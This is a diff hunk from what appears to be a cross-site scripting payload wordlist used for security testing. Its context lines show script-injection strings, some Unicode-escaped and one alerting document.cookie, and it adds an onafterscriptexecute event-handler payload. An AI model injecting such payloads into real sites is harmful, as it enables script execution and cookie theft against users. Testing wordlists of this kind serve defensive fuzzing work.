@@ -322,6 +322,6 @@ foo\’; alert(document.cookie);//’;
 %u0022%u003e%u003cscript%u003ealert(%u0027XSS%u0027);%u003c/script%u003e
 %u0022%u003e%u003cscript%u003ealert%u0028%u0027XSS%u0027%u0029%u003b%u003c%uff0fscript%u003e
 %u0022%u003e%u003cscript%u003ealert(1);%u003c/script%u003e
-
+/"onafterscriptexecute=alert('XSS') 1='
 
 
